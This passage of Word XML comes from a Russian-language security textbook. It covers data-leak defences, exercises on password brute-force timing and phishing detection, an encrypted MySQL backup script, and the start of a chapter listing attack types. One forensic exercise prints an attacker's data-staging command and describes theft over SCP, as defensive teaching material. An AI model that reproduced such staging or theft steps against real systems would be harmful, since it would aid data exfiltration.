      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoint DLP: блокировать копирование БД на USB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Network DLP: блокировать отправку файлов с email/телефонами клиентов на внешние email</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Мониторинг**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SIEM: логировать все запросы к БД, алерты при массовом скачивании данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Backup**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Правило 3-2-1: оригинал (сервер) + backup на внешнем диске (зашифрован GPG) + backup в AWS S3 (зашифрован отдельным ключом)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Offsite backup: S3 в другом регионе</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стоимость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ориентировочно):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TDE для БД: встроено в SQL Server Enterprise (лицензия ~$7000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DLP: ~$50 000/год (Symantec DLP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SIEM: ELK Stack (бесплатно, но нужен администратор ~$100 000/год зарплата)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Backup: AWS S3 (150 ГБ × 3 копии = 450 ГБ) → $10/месяц</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого</w:t>
      </w:r>
      <w:r>
        <w:t>: ~$200 000 в год (DLP + зарплата SIEM-администратора + лицензии)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача**: Сотрудник жалуется, что его заставляют использовать пароль из 16 символов + MFA, и это неудобно. Объясните, почему это необходимо. Посчитайте, сколько времени потребуется подобрать пароль длиной 8 символов vs 16 символов (brute force).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему необходимо:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**60%** утечек данных — из-за слабых или украденных паролей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MFA блокирует **99.9%** автоматических атак</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расчёт времени подбора пароля (brute force)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Алфавит: 26 букв (a-z) + 26 букв (A-Z) + 10 цифр (0-9) + 32 символа (!@#$...) = 94 символа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость подбора: 10 миллиардов паролей/секунду (современная GPU: NVIDIA RTX 4090)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пароль 8 символов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество вариантов: 94^8 ≈ 6 × 10^15</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Время подбора: 6 × 10^15 / 10^10 = 600 000 секунд ≈ **7 дней**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пароль 16 символов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество вариантов: 94^16 ≈ 3.7 × 10^31</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Время подбора: 3.7 × 10^31 / 10^10 = 3.7 × 10^21 секунд ≈ **117 миллиардов лет**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Пароль 16 символов невозможно подобрать brute force.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но</w:t>
      </w:r>
      <w:r>
        <w:t>: Если пароль утёк (фишинг, утечка БД) → нужен MFA, иначе хакер войдёт без подбора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача**: Компания обнаружила, что 50 ГБ данных исчезли с сервера. Какие логи нужно проанализировать для расследования? Какие следы может оставить хакер?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логи для анализа:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Логи SSH/RDP**: кто заходил и когда? С каких IP?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Логи веб-сервера** (nginx/Apache): были ли подозрительные запросы (SQL-инъекции, попытки взлома)?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Логи файловой системы** (auditd в Linux): какие файлы читались/копировались/удалялись?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Логи сетевого трафика** (firewall, IDS): были ли исходящие соединения на большие объёмы данных?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Логи БД**: кто выполнял запросы SELECT/DUMP?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Следы хакера:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>История команд: `~/.bash_history` (если хакер не удалил)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Временные файлы: `/tmp/data.tar.gz` (архив для кражи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сетевые соединения: `netstat -an` (активные соединения на момент атаки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Изменённые файлы: `find / -mtime -7` (файлы, изменённые за последние 7 дней)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример расследования:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Логи SSH: вход с IP из Китая в 3:47 утра</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>История команд: `tar -czf /tmp/backup.tar.gz /var/www/data/*`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Логи firewall: исходящее соединение на 50 ГБ на IP `185.xxx.xxx.xxx` (принадлежит VPN)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вывод: хакер украл SSH-ключ → зашёл → запаковал данные → скачал через SCP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача**: Вы получили письмо: "Ваш аккаунт PayPal будет заблокирован через 24 часа. Подтвердите данные по ссылке: `http://paypal-security.net/verify`". Как определить, что это фишинг?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Признаки фишинга:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Домен**: `paypal-security.net` — не официальный домен PayPal (должен быть `paypal.com`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Протокол**: `http://` (без S) — не зашифрован, PayPal всегда использует HTTPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Срочность**: "через 24 часа" — создаёт панику, заставляет действовать не думая</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ссылка**: настоящий PayPal никогда не просит подтверждать данные по ссылке в письме</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делать:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**НЕ КЛИКАТЬ** на ссылку</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Зайти на `https://paypal.com` напрямую (ввести в браузере, не через письмо)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверить уведомления в аккаунте PayPal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сообщить о фишинге: `phishing@paypal.com`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача**: Настройте зашифрованный backup БД MySQL на сервере Ubuntu. Backup должен загружаться в AWS S3 и быть зашифрован. Напишите bash-скрипт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    &lt;details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    &lt;summary&gt;Решение&lt;/summary&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    #!/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # Скрипт для зашифрованного backup MySQL → AWS S3</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # Переменные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    DB_NAME="mydb"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    DB_USER="root"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    DB_PASSWORD="ваш_пароль"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    BACKUP_DIR="/tmp"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    DATE=$(date +%Y-%m-%d)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    BACKUP_FILE="$BACKUP_DIR/$DB_NAME-$DATE.sql"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ENCRYPTED_FILE="$BACKUP_FILE.gpg"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    S3_BUCKET="s3://my-backup-bucket"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    GPG_PASSWORD="ваш_пароль_для_шифрования"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # 1. Создать дамп БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    echo "Создаём backup БД $DB_NAME..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    mysqldump -u $DB_USER -p$DB_PASSWORD $DB_NAME &gt; $BACKUP_FILE</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # 2. Зашифровать (AES-256)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    echo "Шифруем backup..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    gpg --batch --yes --passphrase "$GPG_PASSWORD" --symmetric --cipher-algo AES256 $BACKUP_FILE</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # 3. Загрузить в S3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    echo "Загружаем в S3..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    aws s3 cp $ENCRYPTED_FILE $S3_BUCKET/</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # 4. Удалить локальные копии</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    echo "Удаляем локальные файлы..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    rm $BACKUP_FILE $ENCRYPTED_FILE</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    echo "Backup завершён: $S3_BUCKET/$DB_NAME-$DATE.sql.gpg"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Настройка cron для автоматического backup каждый день в 3:00</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    crontab -e</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # Добавить строку:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    0 3 * * * /root/backup.sh &gt;&gt; /var/log/backup.log 2&gt;&amp;1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Восстановление backup</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # Скачать из S3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    aws s3 cp s3://my-backup-bucket/mydb-2025-01-14.sql.gpg /tmp/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # Расшифровать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    gpg --batch --yes --passphrase "ваш_пароль_для_шифрования" --decrypt /tmp/mydb-2025-01-14.sql.gpg &gt; /tmp/mydb.sql</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    # Восстановить БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    mysql -u root -p mydb &lt; /tmp/mydb.sql</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Итоги главы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что запомнить:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифруй всё**: диски (BitLocker/LUKS), трафик (HTTPS/VPN/SSH), backup (GPG)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Контроль доступа**: RBAC (роли), MFA (99.9% защита), Least Privilege (минимум прав)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DLP**: блокируй утечки (USB, email, облако)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Мониторинг**: SIEM (анализ логов), алерты, форензика</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обучай персонал**: фишинг, пароли (менеджеры паролей), симуляция</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Организационные меры**: NDA, водяные знаки, exit interview</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Физическая безопасность**: дата-центры (биометрия, клетки), шифрование ноутбуков</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Backup**: 3-2-1 (3 копии, 2 носителя, 1 offsite), шифрование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Главное правило</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Защита конфиденциальности — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>многослойная оборона</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (defense in depth). Если один слой пробили (украли пароль) → остальные слои (MFA, DLP, мониторинг) должны остановить атаку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Следующая глава</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>9.05 Способы нарушения конфиденциальности. Атаки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — разберём конкретные атаки (фишинг, социальная инженерия, MITM, keyloggers), которые противодействие из этой главы должно остановить.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 9.5. Способы нарушения конфиденциальности. Атаки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Как хакеры ломают твою оборону (спойлер: через твою тупость)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, дружище, в главе 9.04 мы разобрали, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как защищаться</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> от утечек данных: шифрование, DLP, MFA, обучение персонала, SIEM. Теперь посмотрим на другую сторону баррикад: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как злоумышленники обходят всю эту защиту и добираются до твоих секретов</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суровая правда</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 99% случаев хакеры не ломают шифрование (это слишком сложно и долго). Они используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>более дешёвые способы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Социальная инженерия** — обманом заставить тебя самого отдать пароль</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Фишинг** — прислать письмо «от банка» и украсть учётные данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Эксплуатация уязвимостей** — найти дырку в софте (SQL-инъекция, XSS, переполнение буфера)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Перехват трафика** — подслушать незашифрованную связь (HTTP вместо HTTPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Вредоносное ПО** — установить шпионскую программу (кейлоггер, троян, ransomware)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Атаки на пароли** — подобрать слабый пароль (brute force, словарь)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Инсайдеры** — сотрудник сливает данные (за деньги или по глупости)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статистика</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**82%** утечек данных — из-за **человеческого фактора** (Verizon DBIR 2023)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**91%** кибератак начинаются с **фишинга** (Proofpoint, 2022)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**60%** компаний взломали через **уязвимость в стороннем ПО** (Ponemon Institute, 2023)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Средняя стоимость одной успешной кибератаки: **$4.45 миллиона** (IBM, 2023)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему защита не работает?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Потому что </w:t>
